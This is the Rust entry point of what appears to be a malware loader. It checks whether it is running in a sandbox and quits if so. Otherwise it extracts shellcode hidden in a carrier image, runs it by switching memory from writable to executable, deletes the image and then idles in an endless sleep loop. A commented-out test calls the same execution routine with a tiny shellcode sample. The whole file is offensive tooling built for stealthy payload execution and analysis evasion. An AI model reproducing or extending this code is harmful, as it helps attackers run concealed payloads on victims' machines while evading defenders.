mod tcp;
mod sandbox;
use sysinfo::System;
mod img;
mod exec;
use std::time::Duration;
use std::thread;

fn main() {
    let mut sys = System::new_all();
    sys.refresh_memory();

    if sandbox::is_sandbox(&sys) {
        return;
    } else {
        let image_path_buf = match img::extract_carrier() {
            Ok(path) => path,
            Err(_) => return, 
        };

        let image_path_str = image_path_buf.to_string_lossy().into_owned();

        let shellcode = img::read(&image_path_str);

        unsafe {
            let _ = exec::execute_shellcode_rw_to_rx(&shellcode);
        }

        let _ = std::fs::remove_file(image_path_buf); 
    }

    loop {
        thread::sleep(Duration::from_secs(3600));
    }
}
// main.rs
// fn main() {
//     // 最简测试：ret 指令
//     let test_sc = vec![
//         0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
//         0xC3,                         // ret
//     ];

//     unsafe {
//         match exec::execute_shellcode_rw_to_rx(&test_sc) {
//             Ok(_) => println!("[*] 执行成功"),
//             Err(e) => eprintln!("[-] 失败: {}", e),
//         }
//     }
// }
